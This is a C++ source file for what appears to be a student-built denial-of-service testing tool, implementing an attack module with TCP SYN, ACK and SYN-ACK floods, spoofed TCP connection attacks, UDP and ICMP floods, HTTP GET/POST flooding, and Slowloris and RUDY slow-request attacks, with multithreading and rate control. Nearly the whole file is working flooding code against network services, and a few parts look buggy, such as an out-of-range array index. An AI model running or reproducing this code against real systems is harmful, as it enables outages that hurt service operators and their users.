#include "../lib/atkmod.h"

// HTTP Attack (for testing)
#define PORT 1234
#define ATTACK_SLEEP 3


ATTACKMODULE::ATTACKMODULE(char* dev, std::string tip, int type, int speed, int dur){
    this->dev = dev;
    this->atktype = type;
    this->speed = speed;
    this->dur = dur;

    get_targetinfo(tip);
}

// target의 정보 받아오기 //
void ATTACKMODULE::get_targetinfo(std::string tip){
    
    /* get target ip */
    inet_pton(AF_INET, tip.c_str(), &target_ip);
    
    /* get target mac */
    PKT packet = PKT(dev);
    packet.set_pcap();
    packet.set_attackinfo(target_ip, target_mac);
}

void ATTACKMODULE::attack(){
    std::thread AttackThreads[THREADS];
    
    if (atktype >= 9){
        more_setting();
        
        if (atktype == 12 || atktype == 14){
            http_attack();
            return;
        }
    };

    for(int i = 0; i < THREADS; i++){
        AttackThreads[i] = std::thread(&ATTACKMODULE::attack_routine, this);
    }
    
    for(int i = 0; i < THREADS; i++){
        AttackThreads[i].join();
    }
}

// TODO:make attack_routine function
void ATTACKMODULE::attack_routine(){

    PKT packet(dev);
    packet.set_pcap();

    /* dur동안 send packet하기 */
    struct timeval start, end, current;
    gettimeofday(&start, 0);
    end.tv_sec = start.tv_sec + dur;

    struct timespec req;
    req.tv_sec = 0;

    long count = 0;
    long avg_swap = 0;
    long avg_sleep = 0;

    while(1){
        std::chrono::system_clock::time_point StartTime = std::chrono::system_clock::now();
        gettimeofday(&current, 0);
        if(current.tv_sec - end.tv_sec >= 0) break;
    
        switch(atktype){

            // TCP_SYN_ATTACK
            case 1:
                packet.make_packet(target_mac, target_ip, TCP, SYN, 0);
                break;
    
            // TCP_ACK_ATTACK
            case 2:
                packet.make_packet(target_mac, target_ip, TCP, ACK, 0);
                break;

            // TCP_SYN-ACK_ATTACK
            case 3:
                packet.make_packet(target_mac, target_ip, TCP, SYN_ACK, 0);
                break;
            
            // TCP_CONNECTION_ATTACK
            case 4:
                tcp_connection_attack(&packet, 0);
                break;

            // TCP_CONGESTION_CONTROL_ATTACK
            case 5:
                tcp_connection_attack(&packet, 1);
                break;

            // TCP_TSNAMI_ATTACK
            case 6:
                packet.make_packet(target_mac, target_ip, TCP, SYN, 1460);
                break;

            // UDP_ATTACK
            case 7:
                packet.make_packet(target_mac, target_ip, UDP, 0, 1000);
                break;

            // ICMP_ATTACK
            case 8:
                packet.make_packet(target_mac, target_ip, ICMP, ICMP_ECHO, 0);
                break;

            
            // GET_FLOODING_ATTACK
            case 9:
                // last arg is for sd
                packet.make_packet(target_mac, target_ip, HTTP, GET, sd);
                break;

            // POST_FLOODING_ATTACK
            case 10:
                // last arg is for sd
                packet.make_packet(target_mac, target_ip, HTTP, POST, sd);
                break;

            // DYNAMIC_HTTP_REQ_FLOODING
            case 11:
                packet.make_packet(target_mac, target_ip, HTTP, DYNAMIC_HTTP_REQ, sd);
                break;

            ////// SLOWLORIS_ATTACK
            // case 12:
            //     packet.make_packet(target_mac, target_ip, HTTP, SLOWLORIS, sd);
            //     break;

            ////// SLOWREAD_ATTACK
            case 13:
                break;

            // R-U-D-Y_ATTACK
            // case 14:
            //     packet.make_packet(target_mac, target_ip, HTTP, RUDY, sd);
            //     break;

            // BIG1_ATTACK
            case 15:

            break;
            
            default:
                printf("type error");
                break;
        }
        int size = 0;

        if(atktype <= 8) packet.send_packet();
        size = packet.get_pktsize();
        count++;
        
        std::chrono::system_clock::time_point EndTime = std::chrono::system_clock::now();
        
        // 보내는데 걸린 interval(초)(=함수구동 + sleep time) : 나가는 비트 수(= 패킷길이 * 8) = 1초 : 원하는 속도(Mbps)
        std::chrono::nanoseconds nano = EndTime - StartTime;
        long l = ((double)size*8 * 953/*for M/n*/ / (double)speed) - nano.count();

        if(l < 0) req.tv_nsec = avg_sleep;
        else req.tv_nsec = l;

        avg_sleep = (avg_sleep * (count - 1) + req.tv_nsec) / count;
        nanosleep(&req, NULL);
    }
}


// sock connet for HTTP attack
void ATTACKMODULE::more_setting(){

	sd = socket(AF_INET, SOCK_STREAM, 0);
	if (sd == -1) {
		perror("socket");
		return;
	}

    struct sockaddr_in addr;
	addr.sin_family = AF_INET;

	addr.sin_port = htons(PORT);
	addr.sin_addr.s_addr = target_ip;
	memset(&addr.sin_zero, 0, sizeof(addr.sin_zero));

    int res = connect(sd, (struct sockaddr *)&addr, sizeof(addr));
	if (res == -1) {
		perror("connect");
		return;
	}

}

void ATTACKMODULE::http_attack(){
    using namespace std;

    struct in_addr target;
    target.s_addr = target_ip;
    string host {inet_ntoa(target)};
    string cont_len;
    string data_str = "";
    string http_type_temp;
    string http_temp = " / HTTP/1.1\r\n";
    string host_temp = "Host: " + host + "\r\n";
    string user_agent_temp = getRandUserAgent() + "\r\n";
    string tmpStr;
    char data[17] = "hello bob 9th!!";

    for (int i = 0 ; i < dur/ATTACK_SLEEP ; i++){
        switch (atktype)    {
        
        // Slowloris - 마지막 개행문자(\r\n)를 생략
        case 12:
            http_type_temp = "POST";
            cont_len = "17";
            data_str = data;
            break;
        
        // RU-Dead-Yet? RUDY ATTACK - Content-length를 높게 설정, 소량의 데이터 전송
        case 14:
            http_type_temp = "POST";
            cont_len = "1000000";
            data_str = data[i % 25];
            break;

        default:
            break;
        }
        string content_len_temp = "Content-length: " + cont_len + "\r\n";
        string tmpStr = http_type_temp + http_temp + host_temp + user_agent_temp + content_len_temp + data_str + "\r\n";
        if (atktype != 12){
            tmpStr += "\r\n";
        }

        ssize_t res = send(sd, tmpStr.c_str(), tmpStr.size(), 0);
        sleep(ATTACK_SLEEP);

    }
}


void ATTACKMODULE::tcp_connection_attack(PKT* packet, int ctrl)
{
    static int  isFirst = 1;

    static uint16_t  id = 0;
    static uint32_t  sender_ip = 0;
    static uint16_t  src_port = 0;
    static uint32_t  seq = 0;
    static uint32_t  ack = 0;
    static uint16_t  window = 0;

    // 처음이라면 랜덤 value
    if(isFirst)
    {
        fill_rand( (uint8_t*)&id,        sizeof(uint16_t) );
        fill_rand( (uint8_t*)&sender_ip, sizeof(uint32_t) );
        fill_rand( (uint8_t*)&src_port,  sizeof(uint16_t) );
        fill_rand( (uint8_t*)&seq,       sizeof(uint32_t) );
        
        if(ctrl)
            window = 1;
        else
            fill_rand( (uint8_t*)&window,    sizeof(uint16_t) );

        packet->make_specific_packet(
            target_mac,  /* target MAC */
            id,          /* id */
            sender_ip,   /* sender IP */
            target_ip,   /* target IP */
            src_port,    /* src port */
            80,          /* dst port */
            seq,         /* sequence number */
            ack,         /* acknowldge number */
            window,      /* window size */
            TCP,         /* packet type */
            SYN,         /* flag type */
            0            /* data length */
        );

        isFirst = 0;
    }

    else
    {
        id++;
        seq++;
        ack++;

        packet->make_specific_packet(
            target_mac,  /* target MAC */
            id,          /* id */
            sender_ip,   /* sender IP */
            target_ip,   /* target IP */
            src_port,    /* src port */
            80,          /* dst port */
            seq,         /* sequence number */
            ack,         /* acknowldge number */
            window,      /* window size */
            TCP,         /* packet type */
            ACK,         /* flag type */
            0            /* data length */
        );

        isFirst = 1;
    }
    
}